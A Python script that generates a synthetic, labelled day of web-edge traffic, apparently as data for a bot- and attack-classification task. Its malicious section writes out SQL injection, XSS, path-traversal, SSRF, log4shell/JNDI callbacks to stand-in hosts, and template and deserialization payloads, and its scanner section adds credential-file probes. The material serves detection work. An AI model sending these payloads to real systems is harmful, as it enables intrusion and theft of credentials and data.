#!/usr/bin/env python3
"""Regenerate events.jsonl and labels.csv: one synthetic day of edge traffic
to a fictional trust-center SaaS, with a labelled persona per IP. Covers the
five categories and, inside malicious, the OWASP classes an edge log
can show: injection (SQLi, XSS, command, template, JNDI), path traversal,
SSRF, credential stuffing, OAuth registration abuse, IDOR / tenant
enumeration, insecure deserialization, plus hard negatives that share a
surface feature with an attack (a customer's script client, a curious user
hitting /admin once, a researcher reading security.txt).
"""

from __future__ import annotations

import csv
import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

rng = random.Random(42)
DAY = datetime(2026, 9, 18, tzinfo=timezone.utc)
HOST = "app.example-trust.io"
TRUST = "trust.example-trust.io"
CHROME = "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
FIREFOX = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0"
ASSETS = ["/assets/index-8f2a1c.js", "/assets/vendor-91bb.js", "/assets/index-c0ffee.css", "/favicon.ico", "/logo.svg"]
API = ["/api/v1/auth/user_info", "/api/v1/tenants/acme/documents", "/api/v1/tenants/acme/pages",
       "/api/v1/tenants/acme/settings", "/api/v1/tenants/acme/audit", "/api/v1/tenants/acme/members"]
TRUST_PATHS = ["/acme", "/acme/documents", "/acme/faq", "/api/v1/trust/pages?tenant_id=t_9f1c2", "/api/v1/trust/documents?tenant_id=t_9f1c2"]

events: list[dict] = []
labels: dict[str, str] = {}


def emit(ip, t, method, url, status, ua, label, host=HOST, waf="allow", waf_rule=None, asn=None, referer=None):
    path, _, query = url.partition("?")
    events.append({"ts": t.isoformat(), "ip": ip, "method": method, "host": host, "path": path,
                   "query": query or None, "status": status, "ua": ua, "waf_action": waf, "waf_rule": waf_rule,
                   "asn": asn, "referer": referer, "source": "gclb"})
    labels[ip] = label


def at(h, m=0, s=0):
    return DAY + timedelta(hours=h, minutes=m, seconds=s)


def jitter(t, lo=0.2, hi=3.0):
    return t + timedelta(seconds=rng.uniform(lo, hi))


# --- benign_user ---------------------------------------------------------------
def browser_session(ip, start, ua, asn, pages=4, label="benign_user"):
    t = start
    for _ in range(pages):
        emit(ip, t, "GET", "/", 200, ua, label, asn=asn)
        for a in ASSETS:
            t = jitter(t, 0.05, 0.4); emit(ip, t, "GET", a, 200, ua, label, asn=asn, referer=f"https://{HOST}/")
        for api in rng.sample(API, 3):
            t = jitter(t, 0.3, 2); emit(ip, t, "GET", api, 200, ua, label, asn=asn, referer=f"https://{HOST}/")
        t = jitter(t, 20, 90)
        if rng.random() < 0.3:
            emit(ip, t, "POST", "/api/v1/tenants/acme/documents", 201, ua, label, asn=asn, referer=f"https://{HOST}/")
    return t


browser_session("203.0.113.10", at(14, 3), CHROME, 7922, pages=6)
t = browser_session("203.0.113.12", at(9, 12), FIREFOX, 3320, pages=3)
emit("203.0.113.12", jitter(t, 5, 9), "GET", "/admin", 404, FIREFOX, "benign_user", asn=3320)          # curious once
emit("203.0.113.12", jitter(t, 12, 15), "GET", "/api/v1/tenants/acme/documnets", 404, FIREFOX, "benign_user", asn=3320)  # typo
# a customer's integration: script UA, regular, always 200, one route
for i in range(96):
    emit("203.0.113.11", at(0, 15 * i, 7), "GET", "/api/v1/tenants/acme/documents", 200,
         "python-requests/2.32.3", "benign_bot", asn=16509)
# a researcher / curious engineer with curl reading the public disclosure files
for p, st in [("/.well-known/security.txt", 200), ("/robots.txt", 200), ("/sitemap.xml", 200), ("/.well-known/openid-configuration", 200)]:
    emit("203.0.113.13", jitter(at(11, 40), 1, 40), "GET", p, st, "curl/8.7.1", "benign_user", asn=7018)
# an authenticated user who signs in with one MFA retry
t = at(16, 20)
for p, st in [("/api/v1/auth/signin-password", 200), ("/api/v1/auth/mfa/verify", 401), ("/api/v1/auth/mfa/verify", 200)]:
    t = jitter(t, 4, 15); emit("203.0.113.14", t, "POST", p, st, CHROME, "benign_user", asn=7922, referer=f"https://{HOST}/login")
browser_session("203.0.113.14", jitter(t, 2, 4), CHROME, 7922, pages=2)

# --- benign_bot ------------------------------------------------------------------
for i in range(60):
    emit("66.249.66.1", at(2, i * 20, rng.randrange(60)), "GET", rng.choice(TRUST_PATHS + ["/robots.txt"]), 200,
         "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", "benign_bot", host=TRUST, asn=15169)
for i in range(30):
    emit("40.77.167.5", at(5, i * 25), "GET", rng.choice(TRUST_PATHS), 200,
         "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)", "benign_bot", host=TRUST, asn=8075)
for i in range(288):
    emit("34.127.136.129", at(0, 5 * i, 4), "GET", "/api/v1/tenant_admin/health", 204, "Google-Cloud-Scheduler", "benign_bot", asn=15169)
for i in range(1440):
    emit("216.144.248.20", at(0, i, 30), "HEAD", "/", 200, "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)", "benign_bot", asn=20473)
for i in range(120):
    emit("54.36.148.10", at(3, i * 6), "GET", rng.choice(TRUST_PATHS + ["/acme/documents/soc2", "/acme/documents/pentest"]), 200,
         "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)", "benign_bot", host=TRUST, asn=16276)
for p in ["/acme", "/acme/documents"]:
    emit("31.13.115.2", jitter(at(13, 2), 1, 5), "GET", p, 200, "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)", "benign_bot", host=TRUST, asn=32934)

# --- ai_agent -----------------------------------------------------------------------
for i in range(80):
    emit("20.171.207.1", at(6, i * 3), "GET", rng.choice(TRUST_PATHS), 200,
         "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; GPTBot/1.2; +https://openai.com/gptbot)", "ai_agent", host=TRUST, asn=8075)
for i in range(40):
    emit("52.14.20.5", at(8, i * 4), "GET", rng.choice(TRUST_PATHS), 200,
         "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; ClaudeBot/1.0; +claudebot@anthropic.com)", "ai_agent", host=TRUST, asn=16509)
for i in range(25):
    emit("3.15.8.8", at(10, i * 7), "GET", rng.choice(TRUST_PATHS), 200,
         "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; PerplexityBot/1.0; +https://perplexity.ai/perplexitybot)", "ai_agent", host=TRUST, asn=16509)
# an MCP client registering and then using the tools API
t = at(15, 5)
emit("44.201.1.9", t, "POST", "/api/v1/auth/oauth/register", 201, "mcp-client/1.0 (claude-desktop; model-context-protocol)", "ai_agent", asn=14618)
for p, st in [("/api/v1/auth/oauth/authorize", 302), ("/api/v1/auth/oauth/token", 200)]:
    t = jitter(t, 2, 20); emit("44.201.1.9", t, "POST" if "token" in p else "GET", p, st, "mcp-client/1.0 (claude-desktop; model-context-protocol)", "ai_agent", asn=14618)
for _ in range(18):
    t = jitter(t, 5, 40); emit("44.201.1.9", t, "POST", "/mcp", 200, "mcp-client/1.0 (claude-desktop; model-context-protocol)", "ai_agent", asn=14618)
# a browsing agent driving a real browser (headless) through the trust page
t = at(17, 30)
for p in ["/acme", "/acme/documents", "/acme/documents/soc2", "/acme/faq"]:
    t = jitter(t, 1, 3); emit("35.190.1.7", t, "GET", p, 200, "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/128.0.0.0 Safari/537.36 browser-use/0.3", "ai_agent", host=TRUST, asn=15169)

# --- background_scan -------------------------------------------------------------------
WP = ["/wp-login.php", "/xmlrpc.php", "/wp-admin/", "/wp-content/plugins/", "/.env", "/.git/config", "/wp-includes/wlwmanifest.xml", "/wordpress/wp-login.php", "/blog/wp-login.php"]
t = at(1, 12)
for p in WP * 2:
    t = jitter(t, 0.1, 0.5); emit("45.155.205.10", t, "GET", p, 404, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36", "background_scan", host="203.0.113.200", asn=44477)
for p in ["/", "/.well-known/security.txt", "/robots.txt"]:
    emit("185.220.101.3", jitter(at(4, 2), 0.5, 2), "GET", p, 200 if p == "/" else 404, "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)", "background_scan", host="203.0.113.200", asn=398324)
PHP = ["/phpmyadmin/index.php", "/pma/index.php", "/myadmin/", "/adminer.php", "/phpinfo.php", "/mysql/", "/db/index.php", "/sql/", "/phpMyAdmin-5.2.1/index.php"]
t = at(7, 44)
for p in PHP * 3:
    t = jitter(t, 0.05, 0.3); emit("91.92.240.7", t, "GET", p, 404, "python-requests/2.28.1", "background_scan", host="203.0.113.200", asn=394711)
emit("162.142.125.5", at(12, 1), "GET", "/", 200, "Mozilla/5.0 zgrab/0.x", "background_scan", host="203.0.113.200", asn=398324)
emit("162.142.125.5", at(12, 1, 1), "GET", "/robots.txt", 404, "Mozilla/5.0 zgrab/0.x", "background_scan", host="203.0.113.200", asn=398324)
IOT = ["/boaform/admin/formLogin", "/HNAP1/", "/GponForm/diag_Form", "/setup.cgi", "/cgi-bin/luci", "/tmUnblock.cgi", "/shell?cd+/tmp"]
for p in IOT:
    emit("193.32.162.9", jitter(at(19, 3), 0.1, 1), "POST" if "Login" in p or "Form" in p else "GET", p, 404, "", "background_scan", host="203.0.113.200", asn=202425)
t = at(21, 15)
for name in ["backup", "site", "www", "db", "app", "old", "database", "dump", "web"]:
    for ext in [".zip", ".sql", ".tar.gz", ".bak", ".rar"]:
        t = jitter(t, 0.05, 0.2); emit("80.94.95.211", t, "GET", f"/{name}{ext}", 404, "Go-http-client/1.1", "background_scan", asn=204428)
# a hostname that is not ours at all (someone pointed DNS at this LB, or a scanner guessing)
for i in range(30):
    emit("87.120.104.29", at(22, i), "GET", "/", 502, "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36", "background_scan", host="vwnfnjosqnhsomoqaqsn.example-cdn.net", waf="deny", waf_rule="invalid-host", asn=34224)

# --- malicious: OWASP classes on real routes ------------------------------------------
# injection (A03): SQLi and XSS against real API parameters, some denied by the WAF
t = at(3, 30)
SQLI = ["' OR 1=1--", "1 UNION SELECT null,version()--", "1' AND SLEEP(5)--", "t_9f1c2' OR 'a'='a", "1; WAITFOR DELAY '0:0:5'--"]
XSS = ["<script>alert(1)</script>", "<img src=x onerror=alert(document.cookie)>", "javascript:alert(1)", "\"><svg onload=alert(1)>"]
for i in range(60):
    payload = rng.choice(SQLI + XSS)
    url = rng.choice([f"/api/v1/trust/documents?tenant_id={payload}", f"/api/v1/tenants/acme/documents?q={payload}", f"/acme/documents?search={payload}"])
    t = jitter(t, 0.2, 1.5)
    emit("194.26.29.4", t, "GET", url, rng.choice([400, 400, 403, 200]), CHROME, "malicious", host=HOST if url.startswith("/api") else TRUST,
         waf="deny" if rng.random() < 0.3 else "allow", waf_rule="sqli-xss-v33" if rng.random() < 0.3 else None, asn=49505)
# credential stuffing (A07): sign-in endpoint at volume, WAF throttling
t = at(2, 50)
for i in range(420):
    t = jitter(t, 0.1, 0.4)
    throttled = i > 60 and rng.random() < 0.7
    emit("5.188.86.2", t, "POST", "/api/v1/auth/signin-password", 429 if throttled else 401, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
         "malicious", waf="throttle" if throttled else "allow", waf_rule="auth-30-per-min" if throttled else None, asn=34665)
# IDOR / tenant enumeration (A01): one template, hundreds of ids, mixed 200/404
t = at(13, 20)
for i in range(300):
    t = jitter(t, 0.3, 1.2)
    tid = f"t_{rng.randrange(16**5):05x}"
    emit("103.99.1.7", t, "GET", f"/api/v1/trust/pages?tenant_id={tid}", 200 if rng.random() < 0.08 else 404, "okhttp/4.12.0", "malicious", host=TRUST, asn=136787)
# path traversal (A01/A05) with a spoofed browser UA, on real routes
t = at(18, 5)
for p in ["/api/v1/tenants/acme/documents/../../../../etc/passwd", "/assets/..%2f..%2f.env", "/api/v1/trust/documents/%2e%2e/%2e%2e/etc/passwd",
          "/api/v1/tenants/acme/documents/..\\..\\windows\\win.ini", "/acme/documents/....//....//etc/shadow"] * 4:
    t = jitter(t, 0.5, 2); emit("141.98.11.5", t, "GET", p, rng.choice([400, 403, 404]), CHROME, "malicious", waf="deny" if rng.random() < 0.4 else "allow", waf_rule="lfi-v33", asn=209605)
# SSRF (A10) + JNDI/log4shell in query and UA
t = at(20, 40)
for i in range(30):
    t = jitter(t, 1, 4)
    url = rng.choice(["/api/v1/tenants/acme/documents/preview?url=http://169.254.169.254/latest/meta-data/",
                      "/api/v1/tenants/acme/pages/import?src=http://127.0.0.1:8080/admin",
                      "/api/v1/trust/pages?tenant_id=${jndi:ldap://x.oast.example/a}",
                      "/api/v1/tenants/acme/settings?callback=//evil.example/x"])
    emit("176.65.144.71", t, "GET", url, rng.choice([400, 403, 401]), "${jndi:ldap://x.oast.example/ua}" if rng.random() < 0.3 else "python-requests/2.31.0", "malicious", asn=209588)
# nuclei against the real API surface (targeted recon with a scanner tool)
t = at(23, 0)
NUCLEI = ["/api/v1/auth/user_info", "/api/v1/tenants/acme/documents", "/api/v1/trust/pages?tenant_id=t_9f1c2", "/api/v1/auth/oauth/register",
          "/api/v1/tenants/acme/documents?q={{interactsh-url}}", "/api/v1/trust/documents?tenant_id=t_9f1c2'\"", "/api/v1/tenants/acme/audit?page=../../"]
for i in range(140):
    t = jitter(t, 0.05, 0.3); emit("23.129.64.1", t, rng.choice(["GET", "GET", "POST", "OPTIONS"]), rng.choice(NUCLEI), rng.choice([401, 400, 404, 405]),
                                   "Mozilla/5.0 (Nuclei - Open-source project (github.com/projectdiscovery/nuclei))", "malicious", waf="deny" if rng.random() < 0.15 else "allow", asn=396507)
# DCR abuse: hammering the one unauthenticated row-creating endpoint
t = at(4, 30)
for i in range(200):
    t = jitter(t, 0.5, 2); emit("198.51.100.50", t, "POST", "/api/v1/auth/oauth/register", 201 if i < 10 else 429, "axios/1.7.2", "malicious",
                                waf="throttle" if i >= 10 else "allow", waf_rule="dcr-10-per-hour" if i >= 10 else None, asn=63949)
# slow, low recon: real endpoints, browser UA, no assets, then IDOR probing of document uuids
t = at(0, 40)
for p in ["/", "/api/v1/auth/user_info", "/api/v1/tenants/acme/documents", "/api/v1/tenants/acme/members", "/api/v1/tenants/acme/settings", "/api/v1/tenants/acme/audit"]:
    t += timedelta(minutes=rng.uniform(20, 70)); emit("89.248.165.2", t, "GET", p, 200 if p == "/" else 401, FIREFOX, "malicious", asn=202425)
for i in range(40):
    t += timedelta(minutes=rng.uniform(3, 9))
    u = f"{rng.randrange(16**8):08x}-{rng.randrange(16**4):04x}-4{rng.randrange(16**3):03x}-a{rng.randrange(16**3):03x}-{rng.randrange(16**12):012x}"
    emit("89.248.165.2", t, "GET", f"/api/v1/trust/documents/{u}?tenant_id=t_9f1c2", 200 if rng.random() < 0.1 else 404, FIREFOX, "malicious", host=TRUST, asn=202425)
# deserialization + template injection over IPv6
t = at(9, 55)
for i in range(24):
    t = jitter(t, 0.5, 3)
    url = rng.choice(["/api/v1/tenants/acme/settings?theme={{7*7}}", "/api/v1/tenants/acme/pages?layout=${7*7}",
                      "/api/v1/tenants/acme/documents?sort=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA", "/api/v1/tenants/acme/members?__proto__[admin]=1"])
    emit("2a02:4780:1:1::1", t, "GET", url, rng.choice([400, 401]), "Apache-HttpClient/4.5.14 (Java/17.0.2)", "malicious", asn=47583)

# --- unclear -------------------------------------------------------------------------------
emit("198.18.0.1", at(12, 30), "GET", "/", 200, CHROME, "unclear", asn=6939)

events.sort(key=lambda e: e["ts"])
here = Path(__file__).parent
with (here / "events.jsonl").open("w") as fh:
    for e in events:
        fh.write(json.dumps({k: v for k, v in e.items() if v is not None}) + "\n")
with (here / "labels.csv").open("w", newline="") as fh:
    w = csv.writer(fh)
    w.writerow(["ip", "label"])
    for ip, label in sorted(labels.items(), key=lambda kv: (kv[1], kv[0])):
        w.writerow([ip, label])
print(f"{len(events)} events, {len(labels)} IPs")
